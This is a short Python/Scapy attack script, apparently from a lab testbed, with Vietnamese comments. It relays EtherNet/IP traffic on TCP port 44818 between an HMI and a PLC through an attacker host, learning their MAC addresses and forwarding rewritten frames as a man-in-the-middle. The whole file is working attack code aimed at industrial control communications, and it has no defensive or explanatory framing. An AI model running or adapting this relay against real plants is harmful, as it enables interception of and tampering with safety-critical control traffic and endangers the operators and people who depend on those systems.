#!/usr/bin/python3
from scapy.all import *
import re

HMI_IP = '192.168.1.70'
HMI_MAC = '00:1D:9C:C8:BC:70'
PLC_IP = '192.168.1.30'
PLC_MAC = '00:1D:9C:C8:BD:30'
ATTACKER_IP = '192.168.1.77'
ATTACKER_MAC = 'AA:AA:AA:AA:AA:AA'

INTERFACE = "attacker-eth0"
ATTACKER_MAC = get_if_hwaddr(INTERFACE)
# Bảng MAC học từ traffic
mac_table = {"HMI": HMI_MAC, "PLC": PLC_MAC}

def spoof_pkt(pkt):
    if not (Ether in pkt and IP in pkt and TCP in pkt):
        #sendp(pkt, iface=INTERFACE, verbose=0)
        return

    if pkt[Ether].src == ATTACKER_MAC or pkt[IP].src == ATTACKER_IP:
        return  # tránh lặp chính attacker

    # Học MAC động
    if pkt[IP].src == HMI_IP:
        mac_table["HMI"] = pkt[Ether].src
    elif pkt[IP].src == PLC_IP:
        mac_table["PLC"] = pkt[Ether].src
    #print(mac_table)
    # Tạo gói mới
    newpkt = pkt.copy()
    newpkt[Ether].src = ATTACKER_MAC

    # HMI → PLC
    if pkt[IP].src == HMI_IP and pkt[IP].dst == PLC_IP:
        if mac_table["PLC"] is None:
            print("Chưa học MAC của PLC")
            return
        newpkt[Ether].dst = PLC_MAC
        del newpkt[IP].chksum
        del newpkt[TCP].chksum
        sendp(newpkt, iface=INTERFACE, verbose=0)


    # PLC → HMI
    elif pkt[IP].src == PLC_IP and pkt[IP].dst == HMI_IP:
        if mac_table["HMI"] is None:
            print("Chưa học MAC của HMI")
            return
        newpkt[Ether].dst = HMI_MAC
        del newpkt[IP].chksum
        del newpkt[TCP].chksum
        sendp(newpkt, iface=INTERFACE, verbose=0)


# Bắt gói
sniff(iface='attacker-eth0', filter='tcp port 44818', prn=spoof_pkt, store=0)